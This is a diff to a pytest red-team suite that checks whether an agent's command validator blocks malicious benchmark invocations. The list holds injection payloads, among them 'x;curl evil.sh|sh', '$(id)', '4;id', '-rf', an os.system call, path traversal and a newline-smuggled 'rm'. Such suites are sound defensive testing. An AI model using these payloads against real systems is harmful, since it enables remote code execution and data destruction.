@@ -1,9 +1,10 @@
 """Red-team suite: every attack must be blocked. Reports the block rate."""
 import pytest
 
+from edge_deploy_agent.runner import BENCH_SCRIPT as BENCH
+from edge_deploy_agent.runner import PI_PYTHON as PY
 from edge_deploy_agent.runner import validate
 
-BENCH = "/home/agent/bench/run.py"
 ATTACKS = [
     [],
     [""],
@@ -17,11 +18,21 @@ ATTACKS = [
     ["vcgencmd", "reboot"],
     ["python3", "/tmp/evil.py"],
     ["python3", "/home/agent/bench/../../tmp/x.py", "--model", "m"],
-    ["python3", BENCH, "--model", "x;curl evil.sh|sh"],
-    ["python3", BENCH, "--model", "$(id)"],
-    ["python3", BENCH, "--model", "-rf"],
-    ["python3", BENCH, "--model", "a" * 65],
-    ["python3", BENCH, "--model", "ok", "--extra"],
+    ["python3", BENCH, "--model", "ok"],
+    [PY, "/tmp/evil.py", "--model", "m"],
+    [PY, BENCH, "--model", "x;curl evil.sh|sh"],
+    [PY, BENCH, "--model", "ok", "--threads", "0"],
+    [PY, BENCH, "--model", "ok", "--threads", "99"],
+    [PY, BENCH, "--model", "ok", "--threads", "4", "--threads", "2"],
+    [PY, BENCH, "--model", "ok", "--iters", "99999"],
+    [PY, BENCH, "--model", "ok", "--threads", "4;id"],
+    [PY, BENCH, "--model", "$(id)"],
+    [PY, BENCH, "--model", "-rf"],
+    [PY, BENCH, "--model", "a" * 65],
+    [PY, BENCH, "--model", "ok", "--opt", "4"],
+    [PY, BENCH, "--model", "ok", "--opt", "-1"],
+    [PY, BENCH, "--model", "ok", "--extra"],
+    [PY, BENCH, "--model", "ok", "--threads"],
     ["python3", "-c", "import os; os.system('id')"],
     ["nproc\n", "rm"],
 ]
